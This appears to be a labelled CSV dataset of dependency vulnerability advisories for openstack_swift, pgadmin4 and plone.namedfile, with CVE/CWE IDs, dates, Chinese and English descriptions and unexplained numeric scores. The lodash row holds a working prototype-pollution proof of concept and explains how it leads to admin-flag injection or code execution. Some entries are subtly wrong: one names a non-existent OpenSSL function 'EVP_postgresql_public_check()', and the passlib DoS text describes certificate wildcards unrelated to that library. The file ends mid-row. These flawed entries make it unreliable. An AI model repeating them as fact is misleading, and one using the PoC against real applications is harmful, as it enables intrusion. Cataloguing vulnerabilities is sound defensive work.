cryptography 存在代码问题漏洞。目前尚无此漏洞的相关信息，请随时关注CNNVD或厂商公告。",3,0
openstack_swift,cryptography,>=2.0.2,True,,,2023-06-03,"pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.5-40.0.2 are vulnerable to a security issue. More details about the vulnerability itself can be found in https://www.openssl.org/news/secadv/20230530.txt.

If you are building cryptography source (""sdist"") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",4,-2
openstack_swift,cryptography,>=2.0.2,True,,,2023-08-02,"pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.8-41.0.2 are vulnerable to several security issues. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20230731.txt, https://www.openssl.org/news/secadv/20230719.txt, and https://www.openssl.org/news/secadv/20230714.txt.

If you are building cryptography source (""sdist"") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",4,-2
openstack_swift,cryptography,>=2.0.2,True,CVE-2023-0217,CWE-476,2023-02-07,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。在3.0.0到3.0.7版本的OpenSSL中，应用程序使用EVP_postgresql_public_check()函数检查格式错误的DSA公钥时，可能触发无效指针解引用漏洞，导致拒绝服务。,2,2
openstack_swift,cryptography,>=2.0.2,True,CVE-2023-0401,CWE-476,2023-02-07,OpenSSL是一个开源的通用加密库，支持SSL和TLS协议。该漏洞出现在3.0.0到3.0.7版本，当验证PKCS7签名数据时，缺少对初始化函数返回值的检查，可能导致空指针解引用，从而引发程序崩溃。,2,2
openstack_swift,cryptography,>=2.0.2,True,CVE-2020-36242,CWE-190 CWE-787,2021-02-07,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography package before 3.3.2 for Python 存在输入验证错误漏洞，该漏洞源于导致整数溢出和缓冲区溢出。",2,2
openstack_swift,cryptography,>=2.0.2,True,CVE-2020-25659,CWE-385,2020-10-25,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 存在安全漏洞，该漏洞源于定时oracle攻击进行RSA解密。",2,0
openstack_swift,cryptography,>=2.0.2,True,CVE-2023-2650,CWE-770,2023-05-30,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。该漏洞源于处理特制的ASN.1对象标识符时可能非常慢，导致系统拒绝服务。,3,0
openstack_swift,cryptography,>=2.0.2,True,CVE-2023-50782,CWE-208 CWE-203,2023-12-13,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography存在安全漏洞。攻击者利用该漏洞可以获取敏感信息。",2,2
openstack_swift,cryptography,>=2.0.2,True,CVE-2022-3996,CWE-667,2022-12-13,OpenSSL是一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库，支持多种加密算法。如果X.509证书包含格式错误的策略约束并且启用了策略处理，系统将递归地获取两次写锁，导致在某些操作系统上进程挂起，进而造成拒绝服务。,2,2
openstack_swift,cryptography,>=2.0.2,True,CVE-2022-4203,CWE-125,2023-02-07,OpenSSL是一个开源的能够实现SSL和TLS协议的通用加密库，支持多种加密算法。该漏洞源于在X.509证书验证中，尤其是在名称约束检查阶段，可以触发读缓冲区溢出。,3,0
openstack_swift,cryptography,>=2.0.2,True,CVE-2023-0216,CWE-476,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，支持多种加密算法。存在无效指针解引用漏洞。当应用程序尝试使用 d2i_PKCS7()、d2i_PKCS7_bio() 或 d2i_PKCS7_fp() 函数加载格式错误的 PKCS7 数据时，可能会导致程序崩溃。,2,2
openstack_swift,cryptography,>=2.0.2,True,CVE-2018-10903,CWE-20,2018-07-19,"python-cryptography是一个基于Python语言的加密标准库。
python-cryptography 1.9.0版本至2.3版本（不包括2.3版本）存在安全漏洞，该漏洞源于finalize_with_tag API没有遵守标签的最小长度值的设置。攻击者可通过构造带有较小标签的无效载荷利用该漏洞绕过MAC，泄露密钥。",2,2
openstack_swift,cryptography,>=2.0.2,True,CVE-2023-3817,CWE-606 CWE-834,2023-07-31,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，常用于车云通信中对传输协议的加解密。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。OpenSSL在部分版本中存在使用DH_check等函数检查DH参数时耗时较长的漏洞，导致拒绝服务。,3,2
openstack_swift,cryptography,>=2.0.2,True,CVE-2023-3446,CWE-606 CWE-1333,2023-07-19,OpenSSL是一个开源的安全套接层和安全传输层协议的通用加密库，支持多种加密算法。在某些版本的OpenSSL中，DH_check()、DH_check_ex()或EVP_PKEY_param_check()函数在处理过大的DH密钥或参数时可能导致应用程序变得非常缓慢，造成拒绝服务。,3,2
openstack_swift,cryptography,>=2.0.2,True,CVE-2023-2975,CWE-354 CWE-287,2023-07-14,"OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。
OpenSSL存在授权问题漏洞，该漏洞源于密码实现存在错误，AES-SIV忽略空的关联数据条目，导致允许对多个关联的进行身份验证数据条目进行加密。",3,2
openstack_swift,cryptography,>=2.0.2,True,CVE-2023-38325,CWE-295,2023-07-14,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 41.0.2之前版本存在安全漏洞，该漏洞源于会错误地处理具有关键选项的 SSH 证书。",2,2
openstack_swift,cryptography,>=2.0.2,True,CVE-2024-4603,CWE-606 CWE-834,2024-05-16,"OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。
OpenSSL 3.0 和 3.1 版本存在安全漏洞，该漏洞源于使用函数 EVP_PKEY_param_check()、EVP_PKEY_public_check() 检查 DSA 公钥或 DSA 参数检查的键或参数，可能会导致拒绝服务。",3,2
openstack_swift,dnspython,>=1.15.0,True,CVE-2023-29483,CWE-292,2024-02-11,"Eventlet是Python的一个并发网络库。
Eventlet 0.35.2之前版本存在安全漏洞，该漏洞源于允许远程攻击者通过从预期的IP地址和源端口快速发送无效数据包来干扰DNS名称解析。",2,0
pgadmin-org_pgadmin4,Flask,3.1.*,True,CVE-2025-47278,CWE-683,2025-05-13,"Flask是Pallets开源的一个用于构建web应用程序的Python微框架。
Flask 3.1.0版本存在安全漏洞，该漏洞源于密钥回退配置处理不当，可能导致使用过期的密钥进行会话签名。",4,0
pgadmin-org_pgadmin4,ldap3,2.*,True,,CWE-592,2018-01-22,"## Overview
[`ldap3`](http://pypi.python.org/pypi/ldap3) is a strictly RFC 4510 conforming LDAP V3 pure Python client library.

Affected versions of this package are vulnerable to Authentication Bypass via the rebind() method of the Connection object. It is performing the following comparison to validate input data:

```py
if password:
    self.password = password
````

That condition is false in case of password = '', so the old value of the object will be keep in that case, including case where the bind was correct.

This is a potential security hole, since a correct bind followed by a rebind with empty password will complete the binding correctly.
## References
- [GitHub Issue](https://github.com/cannatag/ldap3/issues/393)
",2,2
pgadmin-org_pgadmin4,passlib,1.*,True,,CWE-521,2020-05-19,"## Overview

Affected versions of this package are vulnerable to Cryptographic Weakness. The `SHA-256` prehash is unsalted, meaning the resulting `bcrypt` digest is vulnerable to breach correlation attacks.
## Remediation
Upgrade `passlib` to version 1.7.3 or higher.
## References
- [1.7.3 Release Changelog](https://passlib.readthedocs.io/en/stable/history/1.7.html#id1)
- [BitBucket Commit](https://bitbucket.org/ecollins/passlib/commits/bd0da1bdf0fd17b886212649184f2ce3eb8c8329)
- [BitBucket Issue](https://bitbucket.org/ecollins/passlib/issues/114/bcrypt_sha256-is-vulnerable-to-breach)
",3,0
pgadmin-org_pgadmin4,passlib,1.*,True,,CWE-400,2017-12-04,"## Overview
Affected versions of [`passlib`](https://pypi.python.org/pypi/passlib) are vulnerable to Denial of Service (DoS) attack.

`passlib` is enable `wildcard password` by default, which allows remote attackers to cause a denial of service (CPU consumption) via multiple wildcard characters in the common name in a certificate.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `passlib` to version 1.4 or higher.

## References
- [Readthedocs Passlib ChangeLog](http://passlib.readthedocs.io/en/stable/history/ancient.html#hashes)
- [BitBucket Commit](https://bitbucket.org/ecollins/passlib/commits/aca22d57fc1d110be722d71180185f411a3374b7?at=1.4)
",3,2
pgadmin-org_pgadmin4,sqlparse,0.*,True,CVE-2021-32839,CWE-400,2021-09-11,"sqlparse是 Python 的非验证 SQL 解析器。它提供对 SQL 语句的解析、拆分和格式化的支持。
sqlparse 0.4.0 和 0.4.1 版本中存在资源管理错误漏洞，该漏洞允许攻击者进行ReDoS（正则表达式拒绝服务）的攻击。",2,2
pgadmin-org_pgadmin4,sqlparse,0.*,True,CVE-2024-4340,CWE-674,2024-04-16,"sqlparse是 Python 的非验证 SQL 解析器。它提供对 SQL 语句的解析、拆分和格式化的支持。
sqlparse 存在安全漏洞，该漏洞源于应用将嵌套的列表传递给 sqlparse.parse()，导致拒绝服务。",2,2
pgadmin-org_pgadmin4,urllib3,1.26.*,True,CVE-2021-28363,CWE-295,2021-03-15,<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 urllib3 library 1.26.x before 1.26.4 存在信任管理问题漏洞，该漏洞源于SSLContext正确验证的其他服务器的证书将被静默接受。</p>,3,2
pgadmin-org_pgadmin4,urllib3,1.26.*,True,CVE-2021-33503,CWE-400,2021-06-02,"<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 Urllib3 存在资源管理错误漏洞，该漏洞源于在鉴权模块的URL中添加@参数导致，攻击者可利用该漏洞引起资源冲突导致拒绝服务。以下产品及型号会受到影响：Urllib3 0.3, 0.3.1, 0.4, 0.4.1, 1.0, 1.0.1, 1.0.2, 1.1, 1.2, 1.2.1, 1.3, 1.4, 1.5, 1.6, 1.7, 1.7.1, 1.8, 1.8.1, 1.8.2, 1.8.3, 1.9, 1.9.1, 1.10, 1.10.1, 1.10.2, 1.10.3, 1.10.4, 1.11, 1.12, 1.13, 1.13.1, 1.14, 1.15, 1.15.1, 1.16, 1.17, 1.18, 1.18.1, 1.19, 1.19.1, 1.20, 1.21, 1.21.1, 1.22, 1.23, 1.24, 1.24.1, 1.24.2, 1.24.3, 1.25, 1.25.1, 1.25.2, 1.25.3, 1.25.4, 1.25.5, 1.25.6, 1.25.7, 1.25.8, 1.25.9, 1.25.10, 1.25.11, 1.26.0, 1.26.1, 1.26.2, 1.26.3, 1.26.4。</p>",2,2
pgadmin-org_pgadmin4,urllib3,1.26.*,True,CVE-2023-45803,CWE-200,2023-10-17,<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 urllib3存在安全漏洞，该漏洞源于从303状态更改请求方法重定向到GET后不会删除请求正文。受影响的产品和版本：urllib3 2至2.0.6版本，1.26.17及之前版本。</p>,3,0
pgadmin-org_pgadmin4,urllib3,1.26.*,True,CVE-2023-43804,CWE-200,,<p>urllib3 是一个支持线程安全连接池及文件上传等功能的 HTTP 客户端库。该库不对 `Cookie` HTTP 标头进行特殊处理，用户在发送请求时需自行管理。在未显式禁用重定向的情况下，用户可能会意外地通过 HTTP 重定向将信息泄露至其他源。攻击者可利用此漏洞，获取用户的 Cookie 信息，从而进行账户劫持。受影响的版本包括 1.26.16 及之前版本，以及 2.0.5 之前版本。</p>,2,1
pgadmin-org_pgadmin4,urllib3,1.26.*,True,CVE-2024-37891,CWE-669,2024-06-17,"urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。
urllib3存在安全漏洞，该漏洞源于跨域重定向期间不会剥离代理授权请求标头。",3,0
pgadmin-org_pgadmin4,urllib3,1.26.*,True,CVE-2025-50181,CWE-601,2025-06-19,<p>urllib3 是一个常用的 HTTP 客户端库，广泛用于处理 HTTP 请求和响应，包括重定向和重试机制。此漏洞涉及 urllib3 对重定向和重试的处理机制，其中 `Retry` 对象用于控制两者设置。在实例化 `PoolManager` 时设置 `retries` 参数以尝试禁用重定向，然而由于 `retries` 参数被忽略，导致不能正确禁用重定向。该问题会影响依赖于禁用重定向功能的应用程序，可能因此暴露于服务端请求伪造（SSRF）或开放重定向漏洞中。</p>,3,2
pgadmin-org_pgadmin4,requests,>=2.21.0,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
pgadmin-org_pgadmin4,requests,>=2.21.0,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
pgadmin-org_pgadmin4,requests,>=2.21.0,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
pgadmin-org_pgadmin4,lodash,4.*,True,,CWE-1321,2020-08-21,"## Overview
[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.

Affected versions of this package are vulnerable to Prototype Pollution via the `setWith` and `set` functions.

## PoC by awarau
* Create a JS file with this contents:
```
lod = require('lodash')
lod.setWith({}, ""__proto__[test]"", ""123"")
lod.set({}, ""__proto__[test2]"", ""456"")
console.log(Object.prototype)
```
* Execute it with `node`
* Observe that `test` and `test2` is now in the `Object.prototype`.

## Details

Prototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.

There are two main ways in which the pollution of prototypes occurs:

-   Unsafe `Object` recursive merge
    
-   Property definition by path
    

### Unsafe Object recursive merge

The logic of a vulnerable recursive merge function follows the following high-level model:
```
merge (target, source)

  foreach property of source

    if property exists and is an object on both the target and the source

      merge(target[property], source[property])

    else

      target[property] = source[property]
```
<br>  

When the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.

Clone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.

`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.

### Property definition by path

There are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`

If the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.

## Types of attacks

There are a few methods by which Prototype Pollution can be manipulated:

| Type |Origin  |Short description |
|--|--|--|
| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |
 |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|
|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|

## Affected environments

The following environments are susceptible to a Prototype Pollution attack:

-   Application server
    
-   Web server

-   Web browser
    

## How to prevent

1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.
    
2.  Require schema validation of JSON input.
    
3.  Avoid using unsafe recursive merge functions.
    
4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.
    
5.  As a best practice use `Map` instead of `Object`.

### For more information on this vulnerability type:

[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)

## Remediation
Upgrade `lodash` to version 4.17.17 or higher.
## References
- [HackerOne Report](https://hackerone.com/reports/864701)
",2,2
plone_plone.namedfile,Pillow,,True,,,2023-10-05,"## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-56pw-mpj4-fxww. This link is maintained to preserve external references.

## Original Description
Pillow versions before v10.0.1 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). Pillow v10.0.1 upgrades the bundled libwebp binary to v1.3.2.",2,-2
plone_plone.namedfile,Pillow,,True,,CWE-400,2021-04-24,"### Impact
_Pillow before 8.1.1 allows attackers to cause a denial of service (memory consumption) because the reported size of a contained image is not properly checked for a BLP container, and thus an attempted memory allocation can be very large._

### Patches
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### Workarounds
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### References
https://nvd.nist.gov/vuln/detail/CVE-2021-27921

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [example link to repo](http://example.com)
* Email us at [example email address](mailto:example@example.com)",2,2
plone_plone.namedfile,Pillow,,True,,CWE-400,2022-03-12,"JpegImagePlugin may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder.

If the EOF marker is not detected as such however, this could lead to an infinite loop where JpegImagePlugin keeps trying to end the file.",4,-2
plone_plone.namedfile,Pillow,,True,CVE-2022-45198,CWE-409,2022-11-14,"Pillow是一款基于Python的图像处理库。
Pillow 9.2.0之前版本存在安全漏洞，该漏洞源于对高度压缩的GIF数据处理不当。",2,2
plone_plone.namedfile,Pillow,,True,CVE-2020-10994,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/Jpeg2KDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
plone_plone.namedfile,Pillow,,True,CVE-2016-4009,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/Resample.c文件中的‘ImagingResampleHorizontal’函数存在整数溢出漏洞。远程攻击者可借助负的‘new’的大小值利用该漏洞造成拒绝服务（基于堆的缓冲区溢出）。",1,2
plone_plone.namedfile,Pillow,,True,CVE-2020-11538,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.0.0及之前版本中的libImaging/SgiRleDecode.c文件的SGI图像文件的处理存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",1,0
plone_plone.namedfile,Pillow,,True,CVE-2021-27923,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
plone_plone.namedfile,Pillow,,True,CVE-2021-27922,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
plone_plone.namedfile,Pillow,,True,CVE-2021-27921,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
plone_plone.namedfile,Pillow,,True,CVE-2021-25290,CWE-787,2021-03-11,<p>Pillow是一款基于Python的图像处理库。 Pillow 8.1.1之前版本存在安全漏洞。该漏洞源于在TiffDecode.c中存在一个大小无效的负偏移memcpy。</p>,2,2
plone_plone.namedfile,Pillow,,True,CVE-2021-25293,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1版本之前存在安全漏洞。该漏洞源于SGIRleDecode.c中存在越界读取。",2,2
plone_plone.namedfile,Pillow,,True,CVE-2021-25291,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于TiffDecode.c在TiffreadRGBATile中通过无效的title越界读取。",2,2
plone_plone.namedfile,Pillow,,True,CVE-2020-35653,CWE-125,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码一个精心制作的PCX文件时，PoxDecode有一个缓冲区过读，因为缓冲区计算信任用户提供的stride值。",2,0
plone_plone.namedfile,Pillow,,True,,CWE-78,2020-11-02,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Command Injection in filenames that contain single quotes via `load_djpeg`.
## Remediation
Upgrade `Pillow` to version 2.5.0 or higher.
## References
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/748)
- [Pillow Changelog](https://github.com/python-pillow/Pillow/blob/master/CHANGES.rst#250-2014-07-01)
",1,0
plone_plone.namedfile,Pillow,,True,CVE-2020-10378,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
plone_plone.namedfile,Pillow,,True,CVE-2020-10177,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
plone_plone.namedfile,Pillow,,True,CVE-2020-5312,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制PCX文件利用该漏洞在系统上执行任意代码。",1,2
plone_plone.namedfile,Pillow,,True,CVE-2020-5311,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/SgiRleDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制SGI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",1,2
plone_plone.namedfile,Pillow,,True,CVE-2020-5313,CWE-125,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制FLI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",2,0
plone_plone.namedfile,Pillow,,True,CVE-2019-16865,CWE-770,2019-10-04,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.0之前版本中存在安全漏洞。攻击者可利用该漏洞造成拒绝服务。",2,2
plone_plone.namedfile,Pillow,,True,CVE-2016-9189,CWE-190,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可利用该漏洞获取敏感信息。",3,0
plone_plone.namedfile,Pillow,,True,CVE-2016-9190,CWE-284,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可通过使用‘crafted image file’方法利用该漏洞执行任意代码。",2,0
plone_plone.namedfile,Pillow,,True,CVE-2016-0775,CWE-119,2016-04-13,"Pillow是一款基于Python的图像处理库。
Pillow 3.1.1之前版本的libImaging/FliDecode.c文件中的‘ImagingFliDecode’函数存在缓冲区错误漏洞。远程攻击者可借助特制的FLI文件利用该漏洞造成拒绝服务（崩溃）。",2,0
plone_plone.namedfile,Pillow,,True,CVE-2016-2533,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本和PIL 1.1.7及之前版本的PcdDecode.c文件中的‘ImagingPcdDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的PhotoCD文件利用该漏洞造成拒绝服务（崩溃）。",2,0
plone_plone.namedfile,Pillow,,True,CVE-2014-1932,CWE-59,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py文件的‘load_djpeg’函数；EpsImagePlugin.py文件的‘Ghostscript’函数；IptcImagePlugin.py文件的‘load’函数；Image.py文件的‘_copy’函数存在安全漏洞，该漏洞源于程序没有正确创建临时文件。本地攻击者可通过对临时文件的符号链接攻击利用该漏洞覆盖任意文件，获取敏感信息。",2,0
plone_plone.namedfile,Pillow,,True,CVE-2014-1933,CWE-264,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py和EpsImagePlugin.py脚本存在安全漏洞，该漏洞源于程序在命令行上使用临时文件名。本地攻击者可利用该漏洞实施符号链接攻击。",3,0
plone_plone.namedfile,Pillow,,True,CVE-2016-0740,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/TiffDecode.c文件中的‘ImagingLibTiffDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的TIFF文件利用该漏洞覆盖内存。",3,0
plone_plone.namedfile,Pillow,,True,CVE-2020-10379,CWE-120,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/TiffDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
plone_plone.namedfile,Pillow,,True,CVE-2022-24303,CWE-22,2022-02-03,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.1之前版本存在输入验证错误漏洞，该漏洞源于产品的remove操作未验证用户输入数据。攻击者可通过该漏洞利用输入命令来修改或删除预期的命令。",2,2
plone_plone.namedfile,Pillow,,True,CVE-2022-22815,CWE-665,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 不正确地初始化 ImagePath.Path。",3,2
plone_plone.namedfile,Pillow,,True,CVE-2022-22816,CWE-125,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 在 ImagePath.Path 初始化期间有一个缓冲区过度读取。",3,2
plone_plone.namedfile,Pillow,,True,CVE-2022-22817,CWE-94,2022-01-07,"Pillow是一款基于Python的图像处理库。
